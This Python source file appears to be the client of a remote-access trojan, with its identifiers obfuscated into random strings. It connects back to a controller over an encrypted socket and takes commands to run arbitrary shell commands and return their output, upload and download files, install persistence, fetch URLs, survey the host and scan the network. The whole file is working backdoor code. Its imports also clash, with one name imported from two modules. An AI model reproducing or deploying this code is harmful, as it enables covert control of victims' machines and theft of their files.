#!/usr/bin/env python
# -*- coding: utf-8 -*-
import socket
import subprocess
import struct
import sys
try:
    from core.crypto import sUdzqtLgbOHLwwhpgZAqnWQnkYcohXdZ, rupicluuYAUuPXtZzzprBLFiIHrFbgdx, GZwddfwOTaBNFKKNcZkODnEKpIiNMMLm
    from core.filesock import sNdGHwfRcufgNuCsHbgAAzzPLlkgojAe, uwhiOqBSmedbvGGpKrsruHWAGHrUprFP
    from core.persistence import JJyEbjrynmapUHJCDQUQjcshajVjEFwA
    from core.scan import kVoQssmhUOQyeWHSppGMduiAtsJGjVOP
    from core.survey import JJyEbjrynmapUHJCDQUQjcshajVjEFwA
    from core.toolkit import hBwkweoTQVWRFtCiQwUrBWIrKqSmTGBP, RhnTmTNQqHkoWkxISbScOYnmfkMKbIBB
except ImportError as nIIdsEpTvQEohvLzsFtrwptbWNNxzJSk:
    print(nIIdsEpTvQEohvLzsFtrwptbWNNxzJSk)
    sys.exit(0)
dldffcicSVHYEqAwmSwpsAjoihTiQtfo = sys.platform
QKXfbgeIywQJugBtvNEdAecGOByjqzEa      = 'localhost'
BrTysZoSjaLciyLUvtvmWuHNyRXHhOKS      = 1337
MiVrtvzWkBxahaWDOaCsziWcKSHHnCEx    = 'b14ce95fa4c33ac2803782d18341869f'
def kdouLsgGNghZiSMWCCgMSGHXwZSRPGcO():
    DZqtnqwIIAtdcrVFFphUANAFRUgKenqA = socket.socket()
    DZqtnqwIIAtdcrVFFphUANAFRUgKenqA.connect((QKXfbgeIywQJugBtvNEdAecGOByjqzEa, BrTysZoSjaLciyLUvtvmWuHNyRXHhOKS))
    JuKxmoAvQPCxuBFgJgVBrMXQleyCAMTD = GZwddfwOTaBNFKKNcZkODnEKpIiNMMLm(DZqtnqwIIAtdcrVFFphUANAFRUgKenqA)
    while True:
        dkRnsuwlwyECsxXAOdayukBIhcJUHDgY = DZqtnqwIIAtdcrVFFphUANAFRUgKenqA.recv(1024)
        dkRnsuwlwyECsxXAOdayukBIhcJUHDgY = sUdzqtLgbOHLwwhpgZAqnWQnkYcohXdZ(dkRnsuwlwyECsxXAOdayukBIhcJUHDgY, JuKxmoAvQPCxuBFgJgVBrMXQleyCAMTD)
        KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS, _, zVZRMkjmSSANRUTMtnVZiGTkHCKbkJsO = dkRnsuwlwyECsxXAOdayukBIhcJUHDgY.partition(' ')
        if KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS == 'quit':
            DZqtnqwIIAtdcrVFFphUANAFRUgKenqA.close()
            sys.exit(0)
        elif KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS == 'run':
            jLhewPiHvUwpJiUUvJccqlnCSUWejxGe = subprocess.Popen(zVZRMkjmSSANRUTMtnVZiGTkHCKbkJsO, shell=True,
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                      stdin=subprocess.PIPE)
            jLhewPiHvUwpJiUUvJccqlnCSUWejxGe = jLhewPiHvUwpJiUUvJccqlnCSUWejxGe.stdout.read() + jLhewPiHvUwpJiUUvJccqlnCSUWejxGe.stderr.read()
            DZqtnqwIIAtdcrVFFphUANAFRUgKenqA.sendall(rupicluuYAUuPXtZzzprBLFiIHrFbgdx(jLhewPiHvUwpJiUUvJccqlnCSUWejxGe, JuKxmoAvQPCxuBFgJgVBrMXQleyCAMTD))
        elif KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS == 'download':
            for XxPlchPxQLRKcdYmEIicQIuINeJVwooa in zVZRMkjmSSANRUTMtnVZiGTkHCKbkJsO.split():
                XxPlchPxQLRKcdYmEIicQIuINeJVwooa = XxPlchPxQLRKcdYmEIicQIuINeJVwooa.strip()
                uwhiOqBSmedbvGGpKrsruHWAGHrUprFP(DZqtnqwIIAtdcrVFFphUANAFRUgKenqA, XxPlchPxQLRKcdYmEIicQIuINeJVwooa, JuKxmoAvQPCxuBFgJgVBrMXQleyCAMTD)
        elif KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS == 'upload':
            for XxPlchPxQLRKcdYmEIicQIuINeJVwooa in zVZRMkjmSSANRUTMtnVZiGTkHCKbkJsO.split():
                XxPlchPxQLRKcdYmEIicQIuINeJVwooa = XxPlchPxQLRKcdYmEIicQIuINeJVwooa.strip()
                sNdGHwfRcufgNuCsHbgAAzzPLlkgojAe(DZqtnqwIIAtdcrVFFphUANAFRUgKenqA, XxPlchPxQLRKcdYmEIicQIuINeJVwooa, JuKxmoAvQPCxuBFgJgVBrMXQleyCAMTD)
        elif KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS == 'rekey':
            JuKxmoAvQPCxuBFgJgVBrMXQleyCAMTD = GZwddfwOTaBNFKKNcZkODnEKpIiNMMLm(DZqtnqwIIAtdcrVFFphUANAFRUgKenqA)
        elif KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS == 'persistence':
            jLhewPiHvUwpJiUUvJccqlnCSUWejxGe = JJyEbjrynmapUHJCDQUQjcshajVjEFwA(dldffcicSVHYEqAwmSwpsAjoihTiQtfo)
            DZqtnqwIIAtdcrVFFphUANAFRUgKenqA.send(rupicluuYAUuPXtZzzprBLFiIHrFbgdx(jLhewPiHvUwpJiUUvJccqlnCSUWejxGe, JuKxmoAvQPCxuBFgJgVBrMXQleyCAMTD))
        elif KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS == 'wget':
            jLhewPiHvUwpJiUUvJccqlnCSUWejxGe = hBwkweoTQVWRFtCiQwUrBWIrKqSmTGBP(zVZRMkjmSSANRUTMtnVZiGTkHCKbkJsO)
            DZqtnqwIIAtdcrVFFphUANAFRUgKenqA.send(rupicluuYAUuPXtZzzprBLFiIHrFbgdx(jLhewPiHvUwpJiUUvJccqlnCSUWejxGe, JuKxmoAvQPCxuBFgJgVBrMXQleyCAMTD))
        elif KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS == 'unzip':
            jLhewPiHvUwpJiUUvJccqlnCSUWejxGe = RhnTmTNQqHkoWkxISbScOYnmfkMKbIBB(zVZRMkjmSSANRUTMtnVZiGTkHCKbkJsO)
            DZqtnqwIIAtdcrVFFphUANAFRUgKenqA.send(rupicluuYAUuPXtZzzprBLFiIHrFbgdx(jLhewPiHvUwpJiUUvJccqlnCSUWejxGe, JuKxmoAvQPCxuBFgJgVBrMXQleyCAMTD))
        elif KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS == 'survey':
            jLhewPiHvUwpJiUUvJccqlnCSUWejxGe = JJyEbjrynmapUHJCDQUQjcshajVjEFwA(dldffcicSVHYEqAwmSwpsAjoihTiQtfo)
            DZqtnqwIIAtdcrVFFphUANAFRUgKenqA.send(rupicluuYAUuPXtZzzprBLFiIHrFbgdx(jLhewPiHvUwpJiUUvJccqlnCSUWejxGe, JuKxmoAvQPCxuBFgJgVBrMXQleyCAMTD))
        elif KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS == 'scan':
            jLhewPiHvUwpJiUUvJccqlnCSUWejxGe = kVoQssmhUOQyeWHSppGMduiAtsJGjVOP(zVZRMkjmSSANRUTMtnVZiGTkHCKbkJsO)
            DZqtnqwIIAtdcrVFFphUANAFRUgKenqA.send(rupicluuYAUuPXtZzzprBLFiIHrFbgdx(jLhewPiHvUwpJiUUvJccqlnCSUWejxGe, JuKxmoAvQPCxuBFgJgVBrMXQleyCAMTD))
if __name__ == '__main__':
    kdouLsgGNghZiSMWCCgMSGHXwZSRPGcO()
